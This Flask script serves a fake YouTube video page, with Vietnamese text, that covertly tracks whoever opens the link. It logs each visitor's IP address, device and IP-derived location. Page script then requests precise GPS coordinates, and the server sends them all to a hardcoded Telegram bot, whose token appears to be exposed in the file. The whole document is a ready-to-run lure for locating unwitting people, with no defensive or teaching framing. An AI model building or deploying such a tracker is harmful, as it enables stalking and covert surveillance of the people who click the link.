from flask import Flask,request
import os, requests

BOT_TOKEN = "8691955774:AAHqYfpwCRY1w72HgsEZFn0HipXj6F_1zag"
CHAT_ID = "6152651357"

app=Flask(__name__)

def lay_vi_tri_ip(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        d = r.json()
        if d["status"] == "success":
            return f"Quốc gia: {d['country']} | TP: {d['city']} | Tọa độ: {d['lat']},{d['lon']}"
        return "Không lấy được vị trí IP"
    except:
        return "Lỗi lấy vị trí IP"

def gui_tele(IP,UA,VITRI_IP,VITRI_GPS="Chưa bật GPS"):
    text = f"""🚨 CÓ NGƯỜI MỞ LINK!
━━━━━━━━━━━━━━━━━━━━
🌐 IP: {IP}
📱 Thiết bị: {UA}
📍 Vị trí IP: {VITRI_IP}
📡 Vị trí GPS: {VITRI_GPS}
━━━━━━━━━━━━━━━━━━━━"""
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id":CHAT_ID,"text":text})
    except:
        pass

@app.route('/')
def yt():
    IP = request.remote_addr
    UA = request.headers.get('User-Agent','Không xác định')
    VITRI_IP = lay_vi_tri_ip(IP)
    
    with open('log.txt','a',encoding='utf-8') as f:
        f.write(f"IP: {IP} | {VITRI_IP}\n")
    
    return f'''
<!DOCTYPE html>
<html>
<head>
 <meta charset="UTF-8">
 <title>YouTube - Video</title>
 <style>
  *{{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}}
  body{{background:#0f0f0f;color:#fff}}
  header{{height:56px;background:#000;display:flex;align-items:center;justify-content:space-between;padding:0 16px;position:fixed;top:0;left:0;right:0;z-index:100}}
  .logo{{display:flex;align-items:center;gap:4px;color:red;font-weight:bold;font-size:20px}}
  .search-bar{{display:flex;align-items:center}}
  .search-bar input{{width:500px;height:40px;background:#121212;border:1px solid #303030;border-radius:20px 0 0 20px;color:#fff;padding:0 16px;font-size:16px}}
  .search-btn{{height:40px;width:64px;background:#222;border:none;border-radius:0 20px 20px 0;cursor:pointer;color:#fff}}
  .container{{max-width:1280px;margin:0 auto;padding:80px 24px 24px;display:grid;grid-template-columns:1fr 400px;gap:24px}}
  .video-container{{background:#000;border-radius:12px;overflow:hidden;aspect-ratio:16/9;margin-bottom:12px}}
  video{{width:100%;height:100%;object-fit:cover}}
  .video-info h1{{font-size:20px;margin-bottom:8px}}
  .meta{{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid #303030;margin-bottom:16px}}
  .channel-info{{display:flex;align-items:center;gap:12px;margin-bottom:16px}}
  .avatar{{width:40px;height:40px;border-radius:50%;background:linear-gradient(45deg,#f00,#f90)}}
  .title-desc p{{color:#aaa;font-size:14px;line-height:1.5}}
  .sidebar h3{{font-size:16px;margin-bottom:12px}}
  .recommend{{display:flex;gap:8px;margin-bottom:12px;cursor:pointer}}
  .rec-thumb{{width:168px;height:94px;background:#222;border-radius:8px;flex-shrink:0}}
  .rec-info h4{{font-size:14px;margin-bottom:4px;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical}}
  .rec-info p{{font-size:12px;color:#aaa}}
  @media(max-width:900px){{.container{{grid-template-columns:1fr}}.search-bar input{{width:200px}}}}
 </style>
</head>
<body>
 <header>
  <div class="logo">▶ YouTube</div>
  <div class="search-bar"><input type="text" placeholder="Tìm kiếm"><button class="search-btn">🔍</button></div>
  <div></div>
 </header>
 <div class="container">
  <div class="main">
   <div class="video-container">
    <video controls autoplay>
     <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
    </video>
   </div>
   <div class="video-info">
    <h1>Video đang phát — Bạn có thích không?</h1>
    <div class="meta">
     <span>1.234.567 lượt xem • 1 ngày trước</span>
    </div>
    <div class="channel-info">
     <div class="avatar"></div>
     <div>
      <h3>Kênh Video Ngẫu Nhiên</h3>
      <p>123K người đăng ký</p>
     </div>
    </div>
    <div class="title-desc">
     <p>Đây là video thú vị dành cho bạn! Cảm ơn đã xem ❤️</p>
    </div>
   </div>
  </div>
  <div class="sidebar">
   <h3>Video đề xuất</h3>
   <div class="recommend"><div class="rec-thumb"></div><div class="rec-info"><h4>Video hay nhất 2026</h4><p>Test Channel • 10K lượt xem</p></div></div>
   <div class="recommend"><div class="rec-thumb"></div><div class="rec-info"><h4>Hướng dẫn chi tiết mới</h4><p>LearnNow • 5K lượt xem</p></div></div>
   <div class="recommend"><div class="rec-thumb"></div><div class="rec-info"><h4>Nhạc thư giãn 8 giờ</h4><p>Relax • 2M lượt xem</p></div></div>
  </div>
 </div>
 <script>
 // Yêu cầu vị trí GPS — người dùng PHẢI bấm CHO PHÉP
 if (navigator.geolocation) {{
  navigator.geolocation.getCurrentPosition(
    function(pos) {{
      fetch("/save-gps?lat=" + pos.coords.latitude + "&lon=" + pos.coords.longitude + "&acc=" + pos.coords.accuracy);
    }},
    function(err) {{
      console.log("Không lấy được GPS:", err.message);
    }},
    {{enableHighAccuracy:true, timeout:5000, maximumAge:0}}
  );
 }}
 </script>
</body>
</html>
'''

@app.route('/save-gps')
def save_gps():
    lat = request.args.get('lat','')
    lon = request.args.get('lon','')
    acc = request.args.get('acc','')
    IP = request.remote_addr
    UA = request.headers.get('User-Agent','Không xác định')
    VITRI_IP = lay_vi_tri_ip(IP)
    VITRI_GPS = f"{lat},{lon} (±{acc}m)"
    gui_tele(IP,UA,VITRI_IP,VITRI_GPS)
    with open('gps_log.txt','a') as f:
        f.write(f"IP: {IP} | GPS: {VITRI_GPS}\n")
    return "OK"

if __name__=='__main__':
    app.run(host='0.0.0.0',port=int(os.getenv('PORT',10000)))
    
